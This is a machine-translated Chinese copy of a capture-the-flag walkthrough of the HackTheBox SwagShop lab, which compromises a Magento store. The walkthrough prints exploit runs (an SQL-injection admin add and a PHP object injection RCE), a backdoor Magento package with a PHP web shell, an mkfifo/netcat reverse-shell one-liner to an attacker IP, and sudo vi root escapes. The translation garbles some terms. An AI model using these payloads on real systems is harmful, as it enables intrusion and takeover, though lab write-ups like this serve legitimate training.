# 上海交通银行：车间

[0xdf.gitlab.io](https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fswagshop-cover.png) 

SwagShop是一个不错的初学者/轻松的盒子，以Magento在线商店界面为中心。我将使用两个漏洞利用来获得一个 shell。第一个是身份验证绕过，允许我将管理员用户添加到CMS。然后，我可以使用经过身份验证的 PHP 对象注入来获取 RCE。我还将展示如何使用恶意的洋红色包获得RCE。RCE导致外壳和用户。为了私有化root，这是对.`sudo vi`

## 箱子信息

名字

[魔术店](https://www.hackthebox.eu/home/machines/profile/188) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-swagshop.png) 

发行日期

[11 五月 2019](https://twitter.com/hackthebox_eu/status/1126230937577172993)

停用日期

28 9月 2019

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fswagshop-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fswagshop-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天00小时50分钟50秒[![邪恶](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F8932)](https://www.hackthebox.eu/home/users/profile/8932)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 17分40秒。[![旅鼠](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F11933)](https://www.hackthebox.eu/home/users/profile/11933)

造物主

[![](https://image.cubox.pro/article/2022091814483344911/94821.jpg)](https://www.hackthebox.eu/home/users/profile/1)-

## 侦察

### n地图

`nmap`显示 ssh （tcp 22） 和 http （tcp 80）：

    root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.140                                                                                                            
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 15:14 EDT
    Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
    Ping Scan Timing: About 50.00% done; ETC: 15:14 (0:00:00 remaining)
    Nmap scan report for 10.10.10.140
    Host is up (0.100s latency).
    Not shown: 63042 filtered ports, 2491 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 65.98 seconds
    root@kali# nmap -sC -sV -p 80,22 -oA scans/nmap-scripts 10.10.10.140                                                                                                                   
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 15:15 EDT
    Nmap scan report for 10.10.10.140
    Host is up (0.10s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
    |   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
    |_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Home page
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
    

根据 ssh 和 Apache 版本，主机很可能是乌班图 Xenial （16.04）。

### 网站 - TCP 80

#### 网站

网站是HTB的品红色商店：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1557609497532.png) 

#### 目录暴力破解

`gobuster`找到一堆路径，但似乎都与Magento有关。

    root@kali# gobuster  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster-root -u http://10.10.10.140/
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.140/
    [+] Threads      : 50
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : php
    [+] Timeout      : 10s
    =====================================================
    2019/05/11 15:23:42 Starting gobuster
    =====================================================
    /index.php (Status: 200)
    /media (Status: 301)
    /includes (Status: 301)
    /install.php (Status: 200)
    /lib (Status: 301)
    /app (Status: 301)
    /js (Status: 301)
    /api.php (Status: 200)
    /shell (Status: 301)
    /skin (Status: 301)
    /cron.php (Status: 200)
    /var (Status: 301)
    /errors (Status: 301)
    /downloader (Status: 301)
    /mage (Status: 200)
    =====================================================
    2019/05/11 15:29:57 Finished
    ===================================================== 
    

#### 版本

在页面底部，我注意到2014年的版权日期：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1568274284636.png) 

这很有趣，好像它很旧，它应该容易受到很多漏洞的攻击。在常见的洋红色路径上闲逛，我会在以下位置看到不同的日期：`/index.php/admin/`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1568274514407.png) 

在 ，我看到一个版号 的Magento连接管理器：`/downloader/`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1568274614559.png) 

_注意：`/downloader/` 已从此框中删除，作为修补 RCE 方法之一的一种方式。_

我也可以检查，但它只给出了版本1.7.0.2之前的发行说明，然后它提供了一个URL来访问更高版本的发行说明，所以这没有帮助：`/RELEASE_NOTES.txt`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1568274800685.png) 

所有这些都使我得出结论，我真的不知道哪个版本正在运行，但我有一种预感，它可能更老。

## 壳牌作为万维数据

### 添加管理员登录名

看看谷歌和，我会发现一堆Magento的漏洞。首先，我将使用一个称为“[入店行窃](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)”漏洞来添加管理员用户。我将下载python脚本并运行它：`searchsploit`

    root@kali# python poc.py 10.10.10.140
    WORKED
    Check http://10.10.10.140/admin with creds ypwq:123  
    

我可以通过登录 http://10.10.10.140/index.php/admin 来验证这些信誉：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1557609765745.png) 

### RCE #1 - 应用程序对象注入

现在我已经被认证为管理员，还有另一个漏洞会派上用场，我发现它：`searchsploit`

    root@kali# searchsploit magento
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                                                                                                                     |  Path
                                                                                                                                                                                       | (/usr/share/exploitdb/)
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                                 | exploits/php/webapps/32808.txt
    Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                           | exploits/php/webapps/32809.txt
    Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                          | exploits/php/webapps/32810.txt
    Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                     | exploits/php/webapps/39838.php
    Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                       | exploits/php/webapps/37811.py
    Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                             | exploits/php/webapps/35996.txt
    Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                        | exploits/php/webapps/35052.txt
    Magento eCommerce - Local File Disclosure                                                                                                                                          | exploits/php/webapps/19793.txt
    Magento eCommerce - Remote Code Execution                                                                                                                                          | exploits/xml/webapps/37977.py
    eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                       | exploits/php/webapps/38573.txt
    eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                            | exploits/php/webapps/38651.txt
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

在浏览了这些之后，经过身份验证的RCE python脚本看起来最有趣。

有关此错误的背景信息，这是一个PHP对象注入漏洞，[由在此处](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/)找到它的一位研究人员详细介绍。PHP 对象注入是一类属于反序列化漏洞的错误。基本上，服务器将php对象传递到页面中，当浏览器提交回服务器时，它会将该对象作为参数发送。为了防止恶意用户弄乱对象，Magento使用键控哈希来确保完整性。但是，哈希的键是安装数据，可以从 中检索到这些数据。这意味着一旦我有了这个日期，我就可以伪造签名对象并注入我自己的代码，从而导致RCE。`/app/etc/local.xml`

我将从以下位置制作 POC 的副本：`searchsploit`

    root@kali# searchsploit -m exploits/php/webapps/37811.py
      Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
          URL: https://www.exploit-db.com/exploits/37811
         Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
    File Type: Python script, ASCII text executable, with CRLF line terminators
    
    Copied to: /root/hackthebox/swagstore-10.10.10.140/37811.py
    

我将重命名为 ，然后打开它并查看。在配置部分，我必须更新3个字段：`magento_rce.py`

    # Config.
    username = 'ypwq'
    password = '123'
    php_function = 'system'  # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
    

我按照建议从页面中获得了日期：

    root@kali# curl -s 10.10.10.140/app/etc/local.xml | grep date
                <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
    

当我运行它时，我收到一个错误：

    root@kali# python magento_rce.py http://10.10.10.140 "uname -a"
    Traceback (most recent call last):
      File "magento_rce.py", line 56, in <module>
        br['login[password]'] = password
      File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 2780, in __setitem__
        control = self.find_control(name)
      File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 3101, in find_control
        return self._find_control(name, type, kind, id, label, predicate, nr)
      File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 3185, in _find_control
        raise ControlNotFoundError("no control matching "+description)
    mechanize._form.ControlNotFoundError: no control matching name 'login[password]'
    

`mechanize`是一个可编写脚本的浏览器，它抱怨没有带有密码字段的登录表单。这是因为它试图登录网站的底部。我将再次运行它，这次是管理员登录页面：

    root@kali# python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
    Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    

### RCE #2 - 洋红色包装

当盒子发布时，有第二种方法可以通过上传Magento包来获得RCE。似乎此方法已在框的当前实例中修补，因为不再存在。无论如何，我将展示我是如何做到的，但你今天将无法复制这一部分。`/download`

#### 从吉特哈布

[此 GitHub](https://github.com/lavalamp-/LavaMagentoBD) 具有恶意马真图包的模板。我将下载lavalamp\_magento\_bd.tgz，并通过 http://10.10.10.140/downloader/ 上传：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1557662974804.png) 

现在我可以使用它安装的网页外壳：

    root@kali# curl -d 'c=id' http://10.10.10.140/index.php/lavalamp/index
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

#### 白手起家

[这篇文章](https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html)提供了一个很好的演练，用于创建恶意的Magento包。我将按以下结构创建两个文件：

    root@kali# tree .
    .
    ├── errors
    │   └── cmd.php
    └── package.xml
    
    1 directory, 2 files
    

`cmd.php`:

    <?php system($_REQUEST['cmd']); ?>
    

`package.xml`:

    <?xml version="1.0"?>
    <package>
    <name>backdoor</name>
    <version>1.3.3.7</version>
    <stability>devel</stability>
    <licence>backdoor</licence>
    <channel>community</channel>
    <extends/>
    <summary>Backdoor for magento</summary>
    <description>Backdoor for magento</description>
    <notes>backdoor</notes>
    <authors>
        <author>
            <name>jvoisin</name>
            <user>jvoisin</user>
            <email>julien.voisin@dustri.org</email>
        </author>
    </authors>
    <date>2015-08-17</date>
    <time>13:47:49</time>
    <contents>
        <target name="mage">
            <dir>
                <dir name="errors">
                    <file name="cmd.php" hash="c214a2fb80bab315fc328a5eff2892b5"/>
                </dir>
            </dir>
        </target>
    </contents>
    <compatible/>
    <dependencies>
        <required>
            <php>
                <min>5.2.0</min>
                <max>6.0.0</max>
            </php>
        </required>
    </dependencies>
    </package>
    

为 php 文件正确创建哈希非常重要，如下所示：

    root@kali# md5sum errors/cmd.php 
    c214a2fb80bab315fc328a5eff2892b5  errors/cmd.php
    

现在我用它来打包：`tar`

    root@kali# tar -czvf package.tgz errors/ package.xml 
    errors/
    errors/cmd.php
    package.xml
    root@kali# ls
    errors  package.tgz  package.xml
    

并上传文件，我通过网络外壳拥有RCE：`tgz`

    root@kali# curl http://10.10.10.140/errors/cmd.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

### 壳

使用任何一个RCE，我都可以升级到合法的外壳：

    root@kali# python magento_rce.py 'http://10.10.10.140/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"
    

    root@kali# nc -lnvp 9001
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.140.
    Ncat: Connection from 10.10.10.140:41828.
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

从那里我可以抓住：`user.txt`

    $ cat user.txt 
    a4488772...
    

## Privesc 到 root

### 外壳升级

现在我有一个 shell，我将它升级到一个完整的 tty，这将允许我运行像 和 这样的命令，以及制表符完成和箭头键。我不会在每篇文章中都显示这一点，但每次我在Linux上获得shell时，我都会这样做。`su``vi`

很难显示，因为终端被清除，但步骤是：

1.  `python -c 'import pty;pty.spawn("/bin/bash")'`. 也有效。`python3`
2.  按 Ctrl-z 键到背景外壳。在本地提示符下，.`stty raw -echo`
3.  `fg`将外壳带回前面。
4.  `reset`以重新初始化终端。如果系统提示输入“终端类型”，请输入 。`screen`
5.  在重置外壳中，.`export TERM=screen`

我还可以在本地 shell 上使用它来查看行和列。然后，我可以通过运行 来为远程 shell 设置它。这将允许诸如或使用全屏之类的东西。`stty -a``stty rows [#rows] columns [#columns]``vi``less`

### 列举

`sudo -l`显示我可以在没有密码的情况下在网络目录中运行：`sudo``vi`

    www-data@swagshop:/home/haris$ sudo -l
    Matching Defaults entries for www-data on swagshop:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on swagshop:
        (root) NOPASSWD: /usr/bin/vi /var/www/html/*
    

### 读取标志

到达标志的最快路径就是用 打开它。根据上面的输出，我将运行：`vi``sudo`

    www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
    

    c2b087d6...
    
       ___ ___
     /| |/|\| |\
    /_| ´ |.` |_\           We are open! (Almost)
      |   |.  |
      |   |.  |         Join the beta HTB Swag Store!
      |___|.__|       https://hackthebox.store/password
    
                       PS: Use root flag as password!
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    ~
    "/var/www/html/../../../root/root.txt" 10L, 270C
    

### 壳

我当然想要一个贝壳。我将使用 打开一个不存在的文件。`www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/a`

[离开Bins的vi页面](https://gtfobins.github.io/gtfobins/vi/)告诉我如何从这里获取外壳：

    :set shell=/bin/sh
    :shell
    

我将使用 bash，但其他方面相同：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fswagstore-root.gif)

`wc -c root.txt`返回 270，但这是因为有一条带有标志的额外消息：

    root@swagshop:/home/haris# cat /root/root.txt 
    c2b087d6...
    
       ___ ___
     /| |/|\| |\
    /_| ´ |.` |_\           We are open! (Almost)
      |   |.  |
      |   |.  |         Join the beta HTB Swag Store!
      |___|.__|       https://hackthebox.store/password
    
                       PS: Use root flag as password!
    

### 更多 直接外壳

我还可以在 [go awayBins](https://gtfobins.github.io/gtfobins/vi/) 上使用另一个示例，并从命令行获取一个外壳：

    www-data@swagshop:/var/www/html$ sudo vi /var/www/html/a -c ':!/bin/sh'
    

格式在我的 shell 上有点疯狂，很难在这里显示，但它确实返回了一个根 shell。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html)